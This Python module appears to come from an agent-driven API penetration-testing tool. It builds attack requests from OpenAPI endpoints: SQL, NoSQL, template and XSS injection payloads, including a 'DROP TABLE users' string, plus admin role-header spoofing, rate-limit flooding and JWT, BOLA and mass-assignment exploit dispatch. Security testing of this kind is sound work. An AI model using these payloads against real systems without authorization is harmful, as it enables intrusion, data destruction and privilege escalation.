"""Central payload factory — converts AgentDecision + EndpointInfo into PayloadRequests."""
from __future__ import annotations

import logging
import re
import urllib.parse
from itertools import product as _iter_product
from typing import Callable

from core.agents.base_agent import AgentDecision
from core.coordinator.task_builder import Task
from core.parser.openapi_parser import EndpointInfo
from core.payload_factory.exploit_modules.bola_exploit import build_bola_payloads
from core.payload_factory.exploit_modules.jwt_exploit import build_jwt_payloads
from core.payload_factory.exploit_modules.mass_assign_exploit import build_mass_assign_payloads
from core.payload_factory.models import PayloadRequest
from core.payload_factory.nuclei_parser import NucleiPayloadAdapter
from core.payload_factory.schema_mutator import get_string_fields, minimal_body

logger = logging.getLogger(__name__)

# ── Path parameter resolution ────────────────────────────────────────────────

_PATH_PARAM_RE = re.compile(r"\{([^}]+)\}")

_PARAM_TEST_VALUES: dict[str, list[str]] = {
    "username":   ["name1", "admin", "user1", "test"],
    "user":       ["name1", "admin", "user1"],
    "book_title": ["fiction_book_1", "test-book"],
    "book":       ["fiction_book_1"],
    "id":         ["1", "2", "3"],
    "user_id":    ["1", "2"],
    "object_id":  ["1", "2"],
    "item_id":    ["1", "2"],
    "post_id":    ["1", "2"],
    "comment_id": ["1", "2"],
}
_GENERIC_STR = ["test", "admin", "example", "1"]
_GENERIC_INT = ["1", "2", "3"]


def _resolve_path(
    path: str,
    params: list[dict],
    *,
    multi: bool = False,
    known_values: dict[str, str] | None = None,
) -> list[str]:
    """Replace {param} placeholders with test values.

    Returns one path (first value per param) when *multi* is False,
    or all combinations capped at 20 when *multi* is True.
    known_values are inserted at the front of the candidate list when provided.
    """
    placeholders = _PATH_PARAM_RE.findall(path)
    if not placeholders:
        return [path]

    kv = {k.lower(): v for k, v in (known_values or {}).items()}
    param_by_name = {p["name"]: p for p in params if p.get("in") == "path"}
    choices: list[tuple[str, list[str]]] = []
    for name in placeholders:
        info = param_by_name.get(name, {})
        key = name.lower()

        # Prefer caller-supplied known values
        if key in kv:
            base_vals = [kv[key]] + _PARAM_TEST_VALUES.get(key, _GENERIC_STR)
        elif key in _PARAM_TEST_VALUES:
            base_vals = _PARAM_TEST_VALUES[key]
        elif info.get("type") == "integer":
            base_vals = _GENERIC_INT
        else:
            base_vals = _GENERIC_STR

        choices.append((name, base_vals if multi else base_vals[:1]))

    out: list[str] = []
    for combo in _iter_product(*(v for _, v in choices)):
        p = path
        for (n, _), val in zip(choices, combo):
            p = p.replace(f"{{{n}}}", val)
        out.append(p)
        if len(out) >= 20:
            break
    return out


_ExploitFn = Callable[
    [Task, AgentDecision, EndpointInfo],
    list[PayloadRequest],
]

_EXPLOIT_REGISTRY: dict[str, _ExploitFn] = {
    "jwt_exploit": build_jwt_payloads,
    "bola_exploit": build_bola_payloads,
    "mass_assign_exploit": build_mass_assign_payloads,
}

_DEFAULT_PAYLOADS: dict[str, list[str]] = {
    "sqli": ["' OR 1=1--", "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT null--"],
    "nosqli": ['{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}'],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
    "xss": ['<script>alert(1)</script>', '"><script>alert(1)</script>', "javascript:alert(1)"],
}

_ALL_HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

_INJECTION_STRATEGIES = frozenset({"sqli", "nosqli", "ssti", "xss"})
_EXPLOIT_DELEGATE_STRATEGIES = frozenset({
    "horizontal_id_enumeration", "uuid_substitution",
    "privilege_field_injection", "role_escalation",
    "jwt_none_algorithm", "jwt_weak_secret_bruteforce",
    "missing_auth_header", "expired_token_reuse",
})


class PayloadFactory:
    """Converts an AgentDecision + EndpointInfo into a list of PayloadRequests."""

    def __init__(
        self,
        nuclei_adapter: NucleiPayloadAdapter,
        known_values: dict[str, str] | None = None,
    ) -> None:
        self._nuclei = nuclei_adapter
        self._known_values: dict[str, str] = known_values or {}

    def build(
        self,
        task: Task,
        decision: AgentDecision,
        endpoint: EndpointInfo,
    ) -> list[PayloadRequest]:
        """Build all payload variants for the given task and decision."""
        results: list[PayloadRequest] = []

        # Try the named exploit module first
        if decision.use_exploit_module:
            builder = _EXPLOIT_REGISTRY.get(decision.use_exploit_module)
            if builder:
                try:
                    results = builder(task, decision, endpoint)
                except Exception as exc:  # noqa: BLE001
                    logger.warning(
                        "Exploit module %s failed for task %s: %s",
                        decision.use_exploit_module,
                        task.task_id,
                        exc,
                    )

        # If module gave nothing, fall through to strategy builders
        if not results:
            for strategy in decision.chosen_strategies:
                try:
                    results.extend(
                        self._build_for_strategy(strategy, task, decision, endpoint)
                    )
                except Exception as exc:  # noqa: BLE001
                    logger.warning(
                        "Strategy %s failed for task %s: %s",
                        strategy,
                        task.task_id,
                        exc,
                    )

        # Guarantee at least one baseline request
        if not results:
            results.append(self._baseline(task, endpoint))

        return results

    # ── Strategy dispatchers ─────────────────────────────────────────────── #

    def _build_for_strategy(
        self,
        strategy: str,
        task: Task,
        decision: AgentDecision,
        endpoint: EndpointInfo,
    ) -> list[PayloadRequest]:
        s = strategy.lower()
        if s == "rate_limit_absence_check":
            return self._rate_limit_payloads(task, decision, endpoint)
        if s in _INJECTION_STRATEGIES:
            return self._injection_payloads(s, task, endpoint)
        if s == "admin_endpoint_access":
            return self._admin_access_payloads(task, decision, endpoint)
        if s == "http_method_enumeration":
            return self._method_enum_payloads(task, endpoint)
        if s in _EXPLOIT_DELEGATE_STRATEGIES:
            # These are handled by exploit modules; if we reach here it's a fallback
            return [self._baseline(task, endpoint)]
        return [self._baseline(task, endpoint)]

    def _rate_limit_payloads(
        self, task: Task, decision: AgentDecision, endpoint: EndpointInfo
    ) -> list[PayloadRequest]:
        count = int(decision.payload_config.get("request_count", 50))
        path = _resolve_path(endpoint.path, endpoint.params, known_values=self._known_values)[0]
        body = minimal_body(endpoint.body_schema) or None
        return [
            PayloadRequest(
                task_id=task.task_id,
                method=endpoint.method,
                path=path,
                body=body,
                strategy="rate_limit_absence_check",
                label=f"rate_limit:req_{i + 1}",
            )
            for i in range(count)
        ]

    def _injection_payloads(
        self, inj_type: str, task: Task, endpoint: EndpointInfo
    ) -> list[PayloadRequest]:
        payloads = (
            self._nuclei.get_payloads(task.vuln_category)
            or _DEFAULT_PAYLOADS.get(inj_type, [])
        )
        string_fields = get_string_fields(endpoint.body_schema)
        # Separate path params (inject into URL) from query params
        path_string_params = [
            p["name"] for p in endpoint.params
            if p.get("in") == "path" and p.get("type") == "string"
        ]
        query_string_params = [
            p["name"] for p in endpoint.params
            if p.get("in") == "query" and p.get("type") == "string"
        ]
        resolved_path = _resolve_path(
            endpoint.path, endpoint.params, known_values=self._known_values
        )[0]
        results: list[PayloadRequest] = []

        for payload in payloads:
            # Path params: substitute the payload directly into the URL
            for param in path_string_params:
                injected_path = re.sub(
                    r"\{" + re.escape(param) + r"\}",
                    urllib.parse.quote(str(payload), safe=""),
                    endpoint.path,
                )
                results.append(PayloadRequest(
                    task_id=task.task_id,
                    method=endpoint.method,
                    path=injected_path,
                    query_params={},
                    strategy=inj_type,
                    label=f"{inj_type}:path_param={param}",
                ))

            # Query params
            for param in query_string_params:
                results.append(PayloadRequest(
                    task_id=task.task_id,
                    method=endpoint.method,
                    path=resolved_path,
                    query_params={param: payload},
                    strategy=inj_type,
                    label=f"{inj_type}:query={param}",
                ))

            # Body string fields
            for field_name in string_fields:
                body = minimal_body(endpoint.body_schema)
                body[field_name] = payload
                results.append(PayloadRequest(
                    task_id=task.task_id,
                    method=endpoint.method,
                    path=resolved_path,
                    headers={"Content-Type": "application/json"},
                    body=body,
                    strategy=inj_type,
                    label=f"{inj_type}:field={field_name}",
                ))

            # Fallback when no typed input is found
            if not path_string_params and not query_string_params and not string_fields:
                results.append(PayloadRequest(
                    task_id=task.task_id,
                    method=endpoint.method,
                    path=resolved_path,
                    query_params={"q": payload},
                    strategy=inj_type,
                    label=f"{inj_type}:generic",
                ))

        return results[:200]

    def _admin_access_payloads(
        self, task: Task, decision: AgentDecision, endpoint: EndpointInfo
    ) -> list[PayloadRequest]:
        role_headers: dict[str, str] = decision.payload_config.get(
            "role_headers", {"X-Role": "admin", "X-User-Type": "administrator"}
        )
        base = {
            "task_id": task.task_id,
            "method": endpoint.method,
            "path": _resolve_path(endpoint.path, endpoint.params, known_values=self._known_values)[0],
            "body": None,
            "query_params": {},
            "strategy": "admin_endpoint_access",
        }
        return [
            PayloadRequest(**base, headers={}, label="admin_access:no_auth"),
            PayloadRequest(**base, headers=role_headers, label="admin_access:role_spoof"),
        ]

    def _method_enum_payloads(
        self, task: Task, endpoint: EndpointInfo
    ) -> list[PayloadRequest]:
        path = _resolve_path(endpoint.path, endpoint.params, known_values=self._known_values)[0]
        return [
            PayloadRequest(
                task_id=task.task_id,
                method=m,
                path=path,
                strategy="http_method_enumeration",
                label=f"method_enum:{m}",
            )
            for m in _ALL_HTTP_METHODS
        ]

    def _baseline(self, task: Task, endpoint: EndpointInfo) -> PayloadRequest:
        path = _resolve_path(endpoint.path, endpoint.params, known_values=self._known_values)[0]
        return PayloadRequest(
            task_id=task.task_id,
            method=endpoint.method,
            path=path,
            body=minimal_body(endpoint.body_schema) or None,
            strategy="baseline",
            label="baseline",
        )
